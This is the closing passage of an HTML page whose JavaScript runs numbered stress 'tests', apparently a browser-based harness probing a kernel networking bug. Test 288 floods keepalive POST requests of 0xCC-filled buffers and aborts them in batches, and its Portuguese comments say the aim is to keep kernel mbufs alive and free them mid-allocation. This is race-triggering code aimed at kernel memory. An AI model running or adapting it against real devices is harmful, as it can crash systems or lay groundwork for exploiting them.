            if(Math.random() > 0.9) {
                pA.port1.close();
                ports[idx] = new MessageChannel();
            }
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(t); log("287: Done"); }, 4000);
}

function runTest288() {
    log("288. Fetch KeepAlive...");
    var data = new Uint8Array(65536).fill(0xCC); // 64KB chunks
    var controllers = [];
    var t = setInterval(function() {
        try {
            var c = new AbortController();
            // keepalive força o kernel a manter o socket/mbufs vivos mesmo se a thread morrer
            fetch("/mbuf_fragment_test", {
                method: "POST",
                body: data,
                signal: c.signal,
                keepalive: true
            }).catch(e=>{});
            controllers.push(c);
            
            // Aborto rápido para tentar liberar mbufs no meio da alocação do driver
            if(controllers.length > 120) {
                var batch = controllers.splice(0, 60);
                batch.forEach(ctl => ctl.abort());
            }
        } catch(e){}
    }, 4);
    setTimeout(function(){ clearInterval(t); log("288: Done"); }, 5000);
}
</script>
</body>
</html>
